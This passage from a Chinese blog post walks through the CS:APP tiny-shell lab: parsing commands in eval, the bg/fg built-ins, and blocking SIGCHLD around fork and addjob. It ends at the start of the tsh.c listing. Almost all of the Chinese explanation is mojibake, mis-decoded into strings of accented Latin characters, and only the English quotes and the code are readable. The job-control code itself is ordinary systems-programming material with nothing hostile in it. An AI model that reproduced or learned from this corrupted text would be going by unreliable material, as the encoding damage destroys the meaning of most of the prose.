çš„é»˜è®¤æ“ä½œæ˜¯å°†è¿›ç¨‹ç½®äºå·²åœæ­¢çŠ¶æ€ï¼Œç›´åˆ°æ”¶åˆ° SIGCONT ä¿¡å·å°†å…¶å”¤é†’ä¸ºæ­¢ã€‚UnixShell è¿˜æä¾›å„ç§æ”¯æŒä½œä¸šæ§åˆ¶çš„å†…ç½®å‘½ä»¤ã€‚ä¾‹å¦‚:</p></li></ul><blockquote><p>â€¢ jobs: List the running and stopped background jobs.<br>â€¢ bg &lt;job&gt;: Change a stopped background job to a running background job.<br>â€¢ fg &lt;job&gt;: Change a stopped or running background job to a running in the foreground.<br>â€¢ kill &lt;job&gt;: Terminate a job.</p></blockquote><p>æˆ‘ä»¬éœ€è¦å®Œæˆtsh.cæ–‡ä»¶ä¸‹é¢çš„å‡½æ•°ä»¥å®ç°shellçš„åŠŸèƒ½</p><blockquote><p>â€¢ eval: Main routine that parses and interprets the command line. [70 lines]<br>â€¢ builtin cmd: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. [25 lines]<br>â€¢ do bgfg: Implements the bg and fg built-in commands. [50 lines]<br>â€¢ waitfg: Waits for a foreground job to complete. [20 lines]<br>â€¢ sigchld handler: Catches SIGCHILD signals. 80 lines]<br>â€¢ sigint handler: Catches SIGINT (ctrl-c) signals. [15 lines]<br>â€¢ sigtstp handler: Catches SIGTSTP (ctrl-z) signals. [15 lines]</p></blockquote><p>builtin_cmdéœ€è¦å¤„ç†ä»¥ä¸‹<strong>å†…ç½®å‘½ä»¤</strong>ï¼š</p><ul><li>quit</li><li>jobs</li><li>bg</li><li>fg</li></ul><h1 id="ç¨‹åºæ‰§è¡Œæµ"><a href="#ç¨‹åºæ‰§è¡Œæµ" class="headerlink" title="ç¨‹åºæ‰§è¡Œæµ"></a>ç¨‹åºæ‰§è¡Œæµ</h1><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p>è°ƒç”¨äº†signalå‡½æ•°è¿›è¡Œäº†ä¿¡å·çš„è‡ªå®šä¹‰å®‰è£…</p><p>è¿›å…¥whileæ— é™å¾ªç¯</p><ul><li>è¾“å‡ºå‘½ä»¤æç¤ºç¬¦</li><li>ç„¶åè¿›è¡Œäº†å‘½ä»¤è¡Œå­—ç¬¦ä¸²çš„è¯»å–ï¼Œå¦‚æœä¸æˆåŠŸæˆ–è€…eofä¹Ÿè¿›è¡Œäº†å¤„ç†</li><li>è°ƒç”¨evalå‡½æ•°å¯¹è¾“å…¥çš„å‘½ä»¤è¿›è¡Œå¤„ç†</li></ul><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><blockquote><p>evalçš„å®ç°å¯ä»¥å‚è€ƒPPTå’Œcsapp P543çš„å†…å®¹</p><p><code>eval</code>ä¸­è¿›ç¨‹åœ¨<code>fork</code>ä¹‹å‰ç”¨<code>sigprocmask</code>é˜»å¡<code>SIGCHLD</code>ä¿¡å·ï¼Œä¹‹ååœ¨è§£é™¤ä¿¡å·é˜»å¡ï¼Œä¹‹ååœ¨è°ƒç”¨<code>addjob</code>æ·»åŠ å­©å­åˆ°ä½œä¸šåˆ—è¡¨ç”¨<code>sigprocmask</code>é˜»å¡ä¿¡å·ï¼Œå› ä¸ºå­ç»§æ‰¿ç»§æ‰¿çˆ¶è¿›ç¨‹çš„é˜»å¡é›†åˆï¼Œæ‰€ä»¥å­ç¨‹åºå¿…é¡»ç¡®ä¿åœ¨æ‰§è¡Œæ–°è¿›ç¨‹å‰è§£é™¤é˜»å¡<code>SIGCHLD</code>ä¿¡å·ã€‚çˆ¶è¿›ç¨‹éœ€ä»¥è¿™ç§æ–¹å¼é˜»å¡<code>SIGCHLD</code>ä¿¡å·ï¼Œé¿å…åœ¨çˆ¶è¿›ç¨‹è°ƒç”¨<code>addjob</code>ä¹‹å‰ï¼Œ<code>SIGCHLD</code>å¤„ç†å™¨è·å–å­è¿›ç¨‹(ä»è€Œä»ä»»åŠ¡åˆ—è¡¨ä¸­åˆ é™¤)çš„ç«äº‰çŠ¶æ€</p></blockquote><ul><li>è°ƒç”¨parselineå¯¹è¾“å…¥çš„å‘½ä»¤cmdlineè¿›è¡Œå¤„ç†ï¼Œå°†å‘½ä»¤è¡Œè§£æåçš„ç»“æœæ”¾åˆ°argvä¸­ï¼Œparselineæœ€ç»ˆè¿”å›å€¼ä¸ºæ˜¯å¦åœ¨åå°è¿è¡Œ</li><li>è°ƒç”¨builtin_cmdå‡½æ•°ï¼Œbuiltin_cmdå†…éƒ¨éœ€è¦å¤„ç†ä»¥ä¸‹<strong>å†…ç½®å‘½ä»¤</strong>ï¼šquitï¼Œjobsï¼Œbgï¼Œfgï¼Œä½¿ç”¨strcmpå‡½æ•°è¿›è¡Œå­—ç¬¦ä¸²çš„æ¯”è¾ƒï¼Œå¹¶åˆ†åˆ«è¿›è¡Œå¤„ç†ï¼Œå¦‚æœä¸æ˜¯å†…ç½®å‘½ä»¤è¯´æ˜è¦forkå‡ºå­è¿›ç¨‹è¿›è¡Œå¤„ç†</li><li>ç”±äºçˆ¶å­è¿›ç¨‹çš„æ‰§è¡Œé¡ºåºæ˜¯ä¸å›ºå®šçš„ï¼Œæœ‰å¯èƒ½å­è¿›ç¨‹çš„æ‰§è¡Œå…ˆäºçˆ¶è¿›ç¨‹ï¼Œé‚£ä¹ˆä¼šé€ æˆç«äº‰æ¡ä»¶çš„é—®é¢˜ï¼Œä½¿ç¨‹åºå‡ºç°bugã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦ä¿¡å·å±è”½çš„ä¸€äº›æ“ä½œ<ul><li>çˆ¶è¿›ç¨‹å…ˆé˜»å¡SIGCHLDä¿¡å·ï¼Œç„¶åæ‰§è¡Œforkå‡½æ•°ã€‚å¦‚æœè¿”å›å€¼ä¸º0ï¼Œè¯´æ˜æ˜¯å­è¿›ç¨‹ï¼Œå­è¿›ç¨‹éœ€è¦ä½¿ç”¨Sigprocmask(SIG_SETMASK, &amp;prev_one, NULL); è§£é™¤SIGCHLDçš„é˜»å¡ï¼Œä¹‹åä½¿ç”¨Setpgid(0,0);è®¾ç½®pgidä¸ºå­è¿›ç¨‹çš„pidï¼Œå¹¶ç”¨execveæ‰§è¡Œç¨‹åº</li><li>å¦‚æœè¿”å›å€¼ä¸æ˜¯0ï¼Œè¯´æ˜æ˜¯çˆ¶è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹åœ¨addjobçš„æ—¶å€™ç”±äºè¦é˜²æ­¢ç«äº‰æ¡ä»¶é—®é¢˜ï¼Œå› æ­¤åœ¨addjobå‡½æ•°å‰åéœ€è¦ä¿¡å·çš„é˜»å¡ä¸è¿˜åŸ</li><li>çˆ¶è¿›ç¨‹åˆ¤æ–­æ˜¯å‰å°ä»»åŠ¡è¿˜ä½¿åå°ä»»åŠ¡ï¼Œå¦‚æœæ˜¯å‰å°ä»»åŠ¡é‚£ä¹ˆéœ€è¦ç­‰å¾…å‰å°ä»»åŠ¡æ‰§è¡Œå®Œæˆæ‰å¯ä»¥æ“ä½œï¼Œè¿™é‡Œç›¸å½“äºè¢«é˜»å¡äº†ï¼Œå› æ­¤å¦‚æœåˆ¤æ–­æ˜¯å‰å°ä»»åŠ¡é‚£ä¹ˆéœ€è¦è°ƒç”¨waitfgå‡½æ•°ï¼Œå‚è€ƒlabæŒ‡å¯¼ä¹¦çš„hintå¯ä»¥ä½¿ç”¨whileå¾ªç¯ä¸€ç›´è·å–å‰å°idçš„å€¼ï¼Œå¦‚æœæ˜¯0è¯´æ˜æ²¡æœ‰å‰å°ä»»åŠ¡ï¼Œå¦‚æœä¸æ˜¯0çš„è¯è¯´æ˜æœ‰å‰å°ä»»åŠ¡ï¼Œä½¿ç”¨çº¿ç¨‹å®‰å…¨çš„usleepå‡½æ•°ç­‰å¾…ï¼Œç›¸å½“äºå®ç°äº†wait</li></ul></li></ul><h2 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h2><p>è¦æ±‚ï¼š</p><ul><li>bg &lt; job &gt; å‘½ä»¤é‡å¯ &lt; job &gt; ï¼Œå‘é€ä¸€ä¸ª SIGCONT ä¿¡å·ï¼Œç„¶ååœ¨<strong>åå°</strong>è¿è¡Œå®ƒã€‚&lt; job &gt; å‚æ•°å¯ä»¥æ˜¯ PID æˆ– JID</li><li>fg &lt; job &gt; å‘½ä»¤é‡å¯ &lt; job &gt; ï¼Œå‘é€ä¸€ä¸ª SIGCONT ä¿¡å· ï¼Œç„¶ååœ¨<strong>å‰å°</strong>è¿è¡Œå®ƒã€‚&lt; job &gt; å‚æ•°å¯ä»¥æ˜¯ PID æˆ– JID</li><li>æŠ¥é”™å¤„ç†ï¼šæ¯”å¦‚æ ¼å¼ä¸æ­£ç¡®æˆ–è€…è™½ç„¶æ ¼å¼æ­£ç¡®ä½†æ˜¯æ²¡æœ‰æ­¤è¿›ç¨‹ / job</li></ul><p>å¯¹äºé‡å¯çš„å®ç°ï¼Œå¯ä»¥ä½¿ç”¨killå‡½æ•°çš„sigcontå‚æ•°ï¼Œhintæç¤ºåœ¨ä½¿ç”¨-pidè€Œépid</p><p>æ”¹å˜jobçš„çŠ¶æ€ï¼Œç›´æ¥å¯¹job-&gt;stateèµ‹å€¼å³å¯</p><p>å¦‚æœæ˜¯å‰å°è¿è¡Œï¼Œé‚£ä¹ˆéœ€è¦è°ƒç”¨waitfgå‡½æ•°è¿›è¡Œé˜»å¡</p><h2 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h2><p>SIGCHLDï¼šå½“çˆ¶è¿›ç¨‹çš„æŸä¸€å­è¿›ç¨‹ç»ˆæ­¢ï¼ˆæˆ–è€…å› ä¸ºè°ƒç”¨äº† exit()ï¼Œæˆ–è€…å› ä¸ºè¢«ä¿¡å·æ€æ­»ï¼‰æ—¶ï¼Œï¼ˆå†…æ ¸ï¼‰å°†å‘çˆ¶è¿›ç¨‹å‘é€è¯¥ä¿¡å·</p><p>ä¸ºäº†é˜²æ­¢ç«äº‰æ¡ä»¶å’Œä¿¡å·é»˜è®¤ä¸æ’é˜Ÿï¼Œåœ¨sigchld_handlerå‡½æ•°ä¸­deleteå‰åéœ€è¦å¯¹ä¿¡å·æ©ç è¿›è¡Œæ“ä½œ</p><p>sigchld_handleréœ€è¦åŒ…å«å¯¹è¿›ç¨‹çš„å›æ”¶ï¼Œè¿™é‡Œä½¿ç”¨whileå¾ªç¯ï¼Œé˜²æ­¢æœ‰ä¿¡å·æ²¡æœ‰å¤„ç†çš„æƒ…å†µ</p><h2 id="sigint-handler"><a href="#sigint-handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h2><p>sigintæŒ‡çš„æ˜¯ä½¿ç”¨ctrl+cå¯¹è¿›ç¨‹å‘å‡ºä¸­æ–­ä¿¡å·ï¼Œè¿™æ—¶å€™éœ€è¦ä½¿ç”¨Kill(-fg,sig);å¯¹å‰å°è¿›ç¨‹å‘å‡ºä¸­æ–­ä¿¡å·</p><h2 id="sigtstp-handler"><a href="#sigtstp-handler" class="headerlink" title="sigtstp_handler"></a>sigtstp_handler</h2><p>ä½¿ç”¨Kill(-fg,sig);å¯¹å‰å°è¿›ç¨‹è¿›è¡ŒæŒ‚èµ·</p><h1 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tsh - A tiny shell program with job control</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * &lt;Put your name and login ID here&gt;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><br><span class="hljs-comment">/* Misc manifest constants */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXLINE    1024   <span class="hljs-comment">/* max line size */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXARGS     128   <span class="hljs-comment">/* max args on a command line */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXJOBS      16   <span class="hljs-comment">/* max jobs at any point in time */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXJID    1&lt;&lt;16   <span class="hljs-comment">/* max job ID */</span></span><br><br><span class="hljs-comment">/* Job states */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UNDEF 0 <span class="hljs-comment">/* undefined */</span></span><br><span 